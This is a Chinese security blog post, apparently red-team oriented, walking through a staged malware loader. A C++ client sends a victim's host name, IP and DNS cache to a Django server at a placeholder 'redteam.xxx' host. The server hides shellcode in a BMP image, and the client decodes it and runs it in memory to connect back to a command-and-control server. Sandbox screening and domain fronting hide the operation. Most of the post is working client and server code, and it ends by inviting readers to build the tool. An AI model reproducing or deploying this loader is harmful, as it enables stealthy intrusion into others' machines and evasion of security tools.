> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dK_4AdB1Gw6Kr12HW_L2Yg)

把 shellcode 载荷放在平台生成的隐写图片中，前锋马回传机器基础信息用于判断是否是沙箱或调试机，确认是真实目标，人为准入，目标机解析隐写图片 shellcode 后上线到 c2。

![](https://mmbiz.qpic.cn/mmbiz_png/IXOicg347dAhS0gReQ159NKcWm9x9KVNW78vL0qR3tJqYdbk1UBuIHFYvlF8rZZoCV58zGEQduiawvia0QqA4t1yg/640?wx_fmt=png&wxfrom=13&tp=wxpic)

server 端是 django 写，clinet 是 c++。 环境安装：

```
pip3 install django==2.1.3
pip3 install chardet
pip3 install pycryptodome

```

访问流程： 

1.  客户端随机生成 GUID 动态请求 server 端获取 key 
    
      
    

http://redteam.xxx/key?uuid=41303000200-0400-0500-0006-000700080009

```
wchar_t guidbuffer[GUID_LEN] = { 0 };
GUID guid;
if (CoCreateGuid(&guid))
{
   fprintf(stderr, "create guid error\n");
   return -1;
}
_snwprintf_s(guidbuffer, sizeof(guidbuffer),
   L"%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X",
   guid.Data1, guid.Data2, guid.Data3,
   guid.Data4[0], guid.Data4[1], guid.Data4[2],
   guid.Data4[3], guid.Data4[4], guid.Data4[5],
   guid.Data4[6], guid.Data4[7]);

```

2. 获取客户端 IP，主机名称以及本地 dns 缓存记录 (这里回传数据可以根据实际情况进行定制，例如杀软安装软件等…) ，使用 key 对机器信息 aes 加密发送给 server 端 aes 加解密参考 

```
https://blog.csdn.net/witto_sdy/article/details/83375999 http://redteam.xxx/add?uuid=41303000200-0400-0500-0006-000700080009&target=3d316499851da40d2c29a0cf2e6f645a&dns=e8f1c693514ccd053addeee84cfd350ad0f38374e86f6f799b814cc09dda09c7

```

```
获取主机名以及对于的IP
    WSADATA wsaData;
    int err = WSAStartup(MAKEWORD(2, 0), &wsaData);
    char szHostName[MAX_PATH] = { 0 };
    int nRetCode;
    nRetCode = gethostname(szHostName, sizeof(szHostName));
    char* lpLocalIP;
    PHOSTENT hostinfo;
    hostinfo = gethostbyname(szHostName);
    lpLocalIP = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);
获取本地DNS缓存记录
std::vector<CachedDnsRecord> getDnsCache()
{
    std::vector<CachedDnsRecord> results;
    PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
    HINSTANCE hLib = LoadLibrary(TEXT("DNSAPI.dll"));
    DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
       (DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, "DnsGetCacheDataTable");
    int stat = DnsGetCacheDataTable(pEntry);
    pEntry = pEntry->pNext;
    while (pEntry)
    {
       CachedDnsRecord record;
       record.name = wstring(pEntry->pszName);
       //wprintf(L"%s|", record.name.c_str());
       record.type = pEntry->wType;
       results.push_back(record);
       pEntry = pEntry->pNext;
    }
    free(pEntry);
    return results;
}

```

3. 对回传回来主机名，dns 记录，ip 解密的数据进行判断，根据信息判断是否允许上线，允许上线则用生成一个图片隐写马，等待客户端请求返回解析出来 shelllcode server 端处理代码

```
# 判断生成图片
class TaskShow(View):
  @csrf_exempt
  def post(self, request, **kwargs):
    taskid = (request.POST['taskid'])
    obj = models.Message.objects.get(id=taskid)
    shellcode = "fce88900000060xxxxxxx"  #shellcode 
    cmd = "SimpleShellcode.exe {shellcode}".format(shellcode=shellcode)
    proc = subprocess.Popen(cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
    print(proc.stdout.readline())
    pathfile = (str(obj.UUIDreuslt) + ".bmp")
    time.sleep(5)
    os.rename("save.bmp", pathfile)
    filedir = os.path.join(os.getcwd(), 'images', pathfile)
    shutil.move(pathfile, filedir)
    models.Message.objects.filter(id=taskid).update(gogogo=shellcode)
# 获取appid对应的图片
class Tasktext(View):
    def get(self, request):
        UUIDreuslt = request.GET.get("appid")
        filename = UUIDreuslt + ".bmp"
        filedir = os.path.join(os.getcwd(), 'images', filename)
        if not os.path.exists(filedir):
            return HttpResponse(status=404)
        else:
            filedir_tmp = UUIDreuslt + "_" + str(random.randint(1, 100)) + ".bmp"
            temp_bmp = os.path.join(os.getcwd(), 'images', filedir_tmp)
            photo = open(filedir, 'rb')
            photo2 = open(temp_bmp, 'wb')
            photo2.write(photo.read())
            photo.close()
            photo2.close()
            os.remove(filedir)
            q = models.Message.objects.get(UUIDreuslt=UUIDreuslt)
            print(q.id)
            models.Message.objects.filter(id=q.id).update(cscscs=filedir)
            return FileResponse(open(temp_bmp, 'rb'), content_type='*/*')

```

4.clinet 端循环监听请求对应的图片读取解析图片位移获取 shellcode 并内存加载上线 c2 

http://redteam.xxx/task/cmd?uuid=41303000200-0400-0500-0006-000700080009

```
    DWORD dwStatusCodeReturn = 0;
    while (dwStatusCodeReturn != 200)
    {
       resultStr = webhttp(fullUrlPath, &dwStatusCodeReturn);
       if (dwStatusCodeReturn == 200)
       {
         cout << "exit" << endl;
       }
       cout << "请求失败：" << dwStatusCodeReturn << endl;
       ::Sleep(60 * 1000 * 3);
    }
#位移处理图片中的shelllcode
    std::wstring rightPart = GetRightStr(Url, L"?");
    std::wstring wcs = rightPart.c_str();
    size_t wcsPos = wcs.find(L"appid");
    if (wcsPos != string::npos && dwStatusCode == 200) {
       BITMAPFILEHEADER *pHdr = (BITMAPFILEHEADER *)pBuffer;
       LPBYTE pStr = pBuffer + pHdr->bfOffBits + 3;
       char szTmp[5000];
       RtlZeroMemory(szTmp, 5000);
       for (int i = 0; i < 5000; i++)
       {
         if (*pStr == 0 || *pStr == 0xFF)
         {
          break;
         }
         szTmp<i> = *pStr;
         pStr += 4;
       }
       printf_s(szTmp);
       unsigned int char_in_hex;
       unsigned int iterations = strlen(szTmp);
       unsigned int memory_allocation = strlen(szTmp) / 2;
       VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);
       for (unsigned int i = 0; i < iterations / 2; i++) {
         sscanf_s(szTmp + 2 * i, "%2X", &char_in_hex);
         szTmp<i> = (char)char_in_hex;
       }
       MyVirtualAlloc defVirtualAlloc = (MyVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAlloc");
       MyVirtualProtect defVirtualProtect = (MyVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect");
       void* abvc = defVirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
       memcpy(abvc, szTmp, memory_allocation);
       DWORD ignore;
       defVirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &ignore);
       (*(void(*)()) abvc)();
       delete pBuffer;
    }

```

**对敏感数据进行处理**

沙箱中会静态从内存中匹配 url 链接，这里用域前置来匿名服务器地址， 在 winhttp 中增加个指定的 host 头来实现域前置

```
std::wstring strHost = GetHost(Url); #获取host
std::wstring strRequestStr = GetRequestStr(Url); #获取目录
//wcout << strHost;
//wcout << strRequestStr;
//访问的header
std::wstring  header = L"Host: " + strHost + L"\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
//建立连接的host 
strHost = strHost + L".w.xxxx.com"; //动态域名 
LPCWSTR host = wstringToLPCWSTR(strHost.c_str());
LPCWSTR requestStr = wstringToLPCWSTR(strRequestStr.c_str());
HINTERNET hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
   WINHTTP_NO_PROXY_NAME,
   WINHTTP_NO_PROXY_BYPASS, 0);
DWORD dwReadBytes = 0, dwSizeDW = sizeof(dwSizeDW), dwContentSize = 0, dwIndex = 0, dwStatusCode = 0;
HINTERNET  hConnect = WinHttpConnect(hSession, host,
   INTERNET_DEFAULT_HTTP_PORT, 0);
HINTERNET hRequest = hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
   NULL, WINHTTP_NO_REFERER,
   NULL,
   NULL);
//Add HTTP header 
LPCWSTR header1 = wstringToLPCWSTR(header.c_str());
SIZE_T len = lstrlenW(header1);
WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);
WinHttpSendRequest(hRequest,
   WINHTTP_NO_ADDITIONAL_HEADERS,
   0, WINHTTP_NO_REQUEST_DATA, 0,
   0, 0);
WinHttpReceiveResponse(hRequest, 0);
dwSizeDW = sizeof(dwContentSize);
WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
dwSizeDW = sizeof(dwStatusCode);
WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSizeDW, NULL);
if (dwStatusCodeReturn)
   *dwStatusCodeReturn = dwStatusCode;
BYTE *pBuffer = NULL;
pBuffer = new BYTE[dwContentSize + 1];
ZeroMemory(pBuffer, dwContentSize + 1);
//LPCWSTR header1 = wstringToLPCWSTR(header.c_str());
//SIZE_T len = lstrlenW(header1);
//WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);
if (dwContentSize > 0)
{
   do {
     WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);
   } while (dwReadBytes == 0);
}

```

**实现效果**

![](https://mmbiz.qpic.cn/mmbiz_png/IXOicg347dAhS0gReQ159NKcWm9x9KVNW7z61Xhp3WvVxLED9P0gvgV3ZT61TbD25YlJtZRJ4BejFo1ib3EgRs1g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

### **最终效果**

![](https://mmbiz.qpic.cn/mmbiz_png/IXOicg347dAhS0gReQ159NKcWm9x9KVNWx8ZSKALAT9Le2PZmGvX5cFd4iaANjwucox3fQdX5Xnia1uRVHGxFnxeA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

思路和主要代码都给出来了，动动手就可以写出来了，欢迎交流指正！

**侵权请私聊公众号删文**

 **热文推荐**  

*   [蓝队应急响应姿势之 Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
    
*   [通过 DNSLOG 回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
    
*   [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
    
*   [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
    
*   [实战 | 通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
    
*   [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
    
*   [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
    
*   [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
    
*   [任意账号密码重置的 6 种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
    
*   [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
    
*   [手把手教你 Linux 提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)
    

****欢迎关注 LemonSec****

**觉得不错点个 **“赞”**、“在看 “**